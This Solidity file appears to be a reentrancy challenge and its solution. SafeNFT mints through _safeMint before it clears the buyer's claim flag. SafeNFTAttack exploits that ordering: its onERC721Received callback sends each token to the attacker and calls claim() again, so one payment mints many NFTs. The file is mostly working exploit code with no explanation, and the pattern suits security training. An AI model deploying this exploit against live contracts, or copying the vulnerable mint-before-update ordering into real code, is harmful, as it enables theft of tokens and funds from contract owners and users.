// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC721/extensions/ERC721Enumerable.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

contract SafeNFT is ERC721Enumerable {
    uint256 price;
    mapping(address=>bool) public canClaim;

    constructor(string memory tokenName, string memory tokenSymbol,uint256 _price) ERC721(tokenName, tokenSymbol) {
        price = _price; //price = 0.01 ETH
    }

    function buyNFT() external payable {
        require(price==msg.value,"INVALID_VALUE");
        canClaim[msg.sender] = true;
    }

    function claim() external {
        require(canClaim[msg.sender],"CANT_MINT");
        _safeMint(msg.sender, totalSupply()); 
        canClaim[msg.sender] = false;
    }
 
}

contract SafeNFTAttack is IERC721Receiver{
    uint256 private count;
    address private owner;
    SafeNFT private target;
    uint256 private claimed;

    constructor(uint256 _count, address _target) {
        count = _count;
        owner = msg.sender;
        target = SafeNFT(_target);
    }

    function attack() external payable {
        target.buyNFT{ value: msg.value}();
        target.claim();
    }

    function claimNext() internal {
        claimed++;

        if(claimed!=count){
            target.claim();
        }
    }

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external override returns (bytes4){
        target.transferFrom(address(this), owner, tokenId);

        claimNext();
        return IERC721Receiver.onERC721Received.selector;
    }
}